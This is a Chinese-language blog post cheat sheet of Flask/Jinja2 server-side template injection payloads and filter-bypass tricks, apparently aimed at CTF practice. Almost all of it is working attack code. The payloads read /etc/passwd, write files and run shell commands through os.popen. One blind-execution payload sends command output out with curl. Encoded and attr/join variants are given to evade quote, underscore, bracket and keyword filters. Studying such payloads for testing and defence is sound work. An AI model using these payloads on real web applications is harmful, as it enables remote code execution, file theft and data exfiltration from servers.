---
layout:     post
title:      Flask ssti
subtitle:   总结一下ssti常见payload 和 绕过方式
date:       2020-05-20
author:     BY Diego
header-img: img/wenzhang/post-bg-flask-ssti.jpg
catalog: true
tags:
    - Python
    - 命令注入
---

# 一、 常见payload

```
__class__ 返回调用的参数类型
__bases__ 返回类型列表
__mro__ 此属性是在方法解析期间寻找基类时考虑的类元组
__subclasses__() 返回object的子类
__globals__ 函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价
__getattribute__ 使用实例访问属性时,调用该方法
__dict__ 查看方法
```

获取object

```python
''.__class__.__mro__[2]  #python2
''.__class__.__mro__[1] #python3
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[8] #针对jinjia2/flask为[9]适用 [10]
```

类似request的还可以利用 url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config

通过self.\_\_dict__ 查看


**获取索引**
```python
''.__class__.__mro__[2].__subclasses__().index(file)
```

**读文件**
python2
```python
().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()

''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()
```
python3
```python
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
```

**写文件**
```python
().__class__.__bases__[0].__subclasses__()[40]('/tmp').write('test')

''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('test').write("test")
```

**执行命令**
python3
```python
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
```
python2 (针对catch_warnings模块，python3也可只要知道模块对应位置)
```python
''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen("whoami").read()
```
还有下面方法，直接贴别人图了，（懒）
[![Y5LJMj.png](https://s1.ax1x.com/2020/05/19/Y5LJMj.png)](https://imgchr.com/i/Y5LJMj)

**使用脚本寻找(因环境而异)**
```python
_list =[].__class__.__base__.__subclasses__()
for c in _list:
	try:
		if "open" in c.__init__.__globals__['__builtins__']:
			print(c.__name__,_list.index(c))
	except Exception as e:
		pass
```
读文件
```python
{{[].__class__.__base__.__subclasses__()[对应数].__init__.__globals__['__builtins__'].open("/etc/passwd").read()}}
```
[![Y5LYss.png](https://s1.ax1x.com/2020/05/19/Y5LYss.png)](https://imgchr.com/i/Y5LYss)

命令执行找eval 或者\_\_import__,除去引用os模块还可以用其他可执行命令的模块 commands 等
```python
{{[].__class__.__base__.__subclasses__()[对应数字].__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()")}}

{{[].__class__.__base__.__subclasses__()[对应数字].__init__.__globals__['__builtins__'].__import__('os').popen('whoami').read()}}
```


# 二、 绕过

## ① 单双引号过滤
```python
__init__.__globals__['__builtins__']
# 转化成如下形式
__init__.__globals__.__builtins__
```

使用"request.args" 或者 "request.values"
python2 读举例
```python
?name={{().__class__.__bases__[0].__subclasses__()[40](request.args.aa).read()}}&aa=/etc/passwd
```
values 同理 数据为post

还可用set 语句
```python
{%set chr=[].__class__.__base__.__subclasses__()[61].__init__.__globals__.__builtins__.chr%}{{[].__class__.__base__.__subclasses__()[40](chr(47)+chr(102)+chr(108)+chr(97)+chr(103)).read()}}
```

## ② 下划线过滤
**使用"request.args" 或者 "request.values"**
```python
?name={{[][request.args.class][request.args.base][request.args.sub]()[40]('/etc/passwd').read()}}&class=__class__&base=__base__&sub=__subclasses__
```
![YI1Af0.png](https://s1.ax1x.com/2020/05/19/YI1Af0.png)

**args values 被过滤？？**
```python
{{request.headers['X-Forwarded-For']}}
```
![Yo6Wwj.png](https://s1.ax1x.com/2020/05/20/Yo6Wwj.png)

**畸形方法获取_**
```python
[[]|map|string|list][0][20]
```
[![YoDrKH.png](https://s1.ax1x.com/2020/05/20/YoDrKH.png)](https://imgchr.com/i/YoDrKH)


先将
```python
[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()
```
转化成如下
```python
{{[[]|attr('__class__')|attr('__base__')|attr('__subclasses__')()][0][40]('/etc/passwd')|attr('read')()}}
```
再利用join特性将_分离([1,2,3]|join 结果为123)
```python
{{[[]|attr(['_'*2,'class','_'*2]|join)|attr(['_'*2,'base','_'*2]|join)|attr(['_'*2,'subclasses','_'*2]|join)()][0][40]('/etc/passwd')|attr('read')()}}
```
最后_替换[[]|map|string|list][0][20]
```python
{{[[]|attr([[[]|map|string|list][0][20]*2,'class',[[]|map|string|list][0][20]*2]|join)|attr([[[]|map|string|list][0][20]*2,'base',[[]|map|string|list][0][20]*2]|join)|attr([[[]|map|string|list][0][20]*2,'subclasses',[[]|map|string|list][0][20]*2]|join)()][0][40]('/etc/passwd')|attr('read')()}}
```
![Yor8W8.png](https://s1.ax1x.com/2020/05/20/Yor8W8.png)

## ③ 中括号被过滤

利用该特性a\[2]== a.\_\_getitem__(2)
```python
{{().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(40)('/etc/passwd').read()}}
```

## ④ 过滤{{
利用{%%}
```python
{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}1{% endif %}
```
相当于盲命令执行，利用curl将执行结果带出来
或者而类似布尔注入

## ⑤ 关键字绕过
**base64编码绕过**
\_\_getattribute__使用实例访问属性时,调用该方法
```python
{{[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()}}
```

**字符串拼接绕过**
```python
[].__class__.__base__.__subclasses__()[59].__init__.__globals__['__buil'+'tins__']
```

**format函数**
```python
{{'fl{0}g'.format('a')}}
```
![YoyfG6.png](https://s1.ax1x.com/2020/05/20/YoyfG6.png)
## ⑥ . 被过滤
使用原生JinJa2函数|attr()
```python
?name={{()[(request|attr("args"))["class"]][(request|attr("args"))["base"]][(request|attr("args"))["sub"]]()[40]('/etc/passwd').read()}}&class=__class__&base=__base__&sub=__subclasses__
```

另一种形式（其他编码也可base64等）
```python
{{[]["5F5F636C6173735F5F"["decode"]("hex")]["5F5F626173655F5F"["decode"]("hex")]["5F5F737562636C61737365735F5F"["decode"]("hex")]()[40]("/etc/passwd")["72656164"["decode"]("hex")]()}}
```
![YoGozq.png](https://s1.ax1x.com/2020/05/20/YoGozq.png)

变形
```python
{{[]['\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f']['\x5f\x5f\x62\x61\x73\x65\x5f\x5f']['\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f']()[40]('/etc/passwd')['\x72\x65\x61\x64']()}}
```

畸形方法
获取·
```python
{{[1|float|string|list][0][1]}}
```
![Yo0pqI.png](https://s1.ax1x.com/2020/05/20/Yo0pqI.png)

## ⑦ 下划线、引号、中括号 被过滤

利用上述方法进行组合，构造如下payload

```python
?name={{((()|attr(request.args.class)|attr(request.args.base)|attr(request.args.sub)())|attr(request.args.geti)(40)(request.args.file)).read()}}&class=__class__&base=__base__&sub=__subclasses__&geti=__getitem__&file=/etc/passwd
```
![YIwr6A.png](https://s1.ax1x.com/2020/05/19/YIwr6A.png)

# 三、参考

[SSTI: Bypass in a hard place, Fort Knox — ASIS Quals 2019](https://medium.com/@elberandre/ssti-bypass-in-a-hard-place-fort-knox-asis-quals-2019-91bc35a349d3)

[SSTI Bypass 分析](https://www.secpulse.com/archives/115367.html)

[Flask/Jinja2模板注入中的一些绕过姿势](https://p0sec.net/index.php/archives/120/)

[浅析SSTI(python沙盒绕过)](http://flag0.com/2018/11/11/%E6%B5%85%E6%9E%90SSTI-python%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87/)
